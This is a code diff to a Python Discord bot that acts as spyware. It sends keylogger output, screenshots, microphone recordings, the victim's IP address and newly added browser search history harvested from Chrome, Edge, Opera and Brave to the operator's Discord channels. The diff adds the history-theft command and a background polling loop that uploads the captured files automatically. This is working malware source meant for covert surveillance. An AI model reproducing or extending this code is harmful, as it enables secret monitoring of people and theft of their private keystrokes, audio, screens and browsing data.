@@ -1,19 +1,22 @@
 import discord, time, os, socket
-from discord.ext import commands
+from discord import app_commands
+from discord.ext import commands, tasks
+from history_finder import SearchHistory
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
 
 keylogs_file = "files\\keys.txt"
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=';', intents=intents)
+bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
 
-guild_id = "1198070162432200865"
-screenshot_channel = "1209205802032955413"
-microphone_channel = "1209237919592615937"
-logger_channel = "1215387927023063040"
-connect_channel = "1209247219874668638"
+guild_id = os.getenv('SERVER_ID')
+screenshot_channel = os.getenv('SCREENSHOT_CHANNEL_ID')
+microphone_channel = os.getenv('MICROPHONE_CHANNEL_ID')
+logger_channel = os.getenv('LOGGER_CHANNEL_ID')
+commands_channel = os.getenv('COMMANDS_CHANNEL_ID')
+connect_channel = os.getenv('STATUS_CHANNEL_ID')
 
+searchhistory = SearchHistory()
 microphone = Microphone()
 screenshot = Screenshot()  
 
@@ -63,8 +66,52 @@ async def sendLogs(ctx):
     with open(keylogs_file, "w") as f:
         f.write("")
             
+@bot.tree.command(name="gethistory", description="Send search history from different browsers")
+async def get_history(interaction: discord.Interaction, browser: str, days: int):
+    try:
+        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
+        if browser.lower() in browsers:
+            if browser.lower() == "chrome" or browser.lower() == "google":
+                result, browser = searchhistory.get_chrome()
+            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
+                result, browser = searchhistory.get_edge()
+            if browser.lower() == "opera" or browser.lower() == "opera gx":
+                result, browser = searchhistory.get_opera()
+            if browser.lower() == "brave":
+                result, browser = searchhistory.get_brave()
+
+            guild = await bot.fetch_guild(guild_id)
+            channel = await guild.fetch_channel(commands_channel)
+
+            with open(browser, 'rb') as screenshot_file:
+                await channel.send(file=discord.File(screenshot_file, browser))
+
+        if browser.lower() == "all":
+            result = searchhistory.get_all()
+            await interaction.response.send_message(result)
+        else:
+            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
+    except Exception as e:
+        print(f"YOU FUCKED UP!!!\n{e}")
+
+@tasks.loop(seconds=0.1)
+async def check_files(ctx):
+    while True:
+        for file in os.listdir("files"):
+            if file.endswith(".png"):
+                await sendScreen(ctx=ctx)
+            if file.endswith(".wav"):
+                await sendMic(ctx=ctx)
+            with open(keylogs_file, "r") as f:
+                logs = f.readlines()
+                for lines in logs:
+                    if "SEC: 5" in lines:
+                        await sendLogs(ctx=ctx)
+
 @bot.event
 async def on_ready():
+    e = await bot.tree.sync()
+    print(e)
     guild = await bot.fetch_guild(guild_id)
     channel = await guild.fetch_channel(connect_channel)
 
@@ -72,21 +119,11 @@ async def on_ready():
     ip_address = socket.gethostbyname(hostname)
 
     await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")
+    check_files.start(guild)
 
 @bot.event
 async def on_message(message):
-    while True:
-        for file in os.listdir("files"):
-            if file.endswith(".png"):
-                await sendScreen(ctx=message)
-            if file.endswith(".wav"):
-                await sendMic(ctx=message)
-            with open(keylogs_file, "r") as f:
-                logs = f.readlines()
-                for lines in logs:
-                    if "SEC: 5" in lines:
-                        await sendLogs(ctx=message)
+    if not message.author.bot:
+        await bot.process_commands(message)
 
-        time.sleep(0.1)
-
-bot.run(os.getenv("DISCORD_TOKEN"))
+bot.run(os.getenv("TOKEN"))
